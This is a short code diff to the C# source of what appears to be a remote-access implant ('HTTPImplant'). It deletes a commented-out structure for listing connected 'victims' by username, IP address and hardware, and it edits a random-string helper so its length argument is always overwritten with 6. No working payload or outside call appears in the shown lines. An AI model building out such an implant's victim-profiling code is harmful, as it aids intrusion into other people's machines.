@@ -5,19 +5,6 @@ using System.Text;
 
 namespace HTTPImplant.Modules
 {
-
-    /*
-     // Define a structure above to handle JSON request/responses to list the victims that have connected to the database.
-    type ListDevices struct {
-        Username        string `json:"Victim.username"`
-        Network         string `json:"Network.ip_address"`
-        OperatingSystem string `json:"Operating_System.name"`
-        CPU             string `json:"CPU.architecture"`
-        GPU             string `json:"GPU.information"`
-        RAM             string `json:"RAM.amount"`
-        Storage         string `json:"Storage.amount"`
-    }
-     */
     public class GetImplantInfo
     {
         public static string Username()
@@ -38,8 +25,9 @@ namespace HTTPImplant.Modules
         private static readonly Random random = new Random();
         private static readonly string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 
-        public static string GenerateRandomString(int length = 6)
+        public static string GenerateRandomString(int length)
         {
+            length = 6;
             var stringBuilder = new StringBuilder(length);
 
             for (int i = 0; i < length; i++)
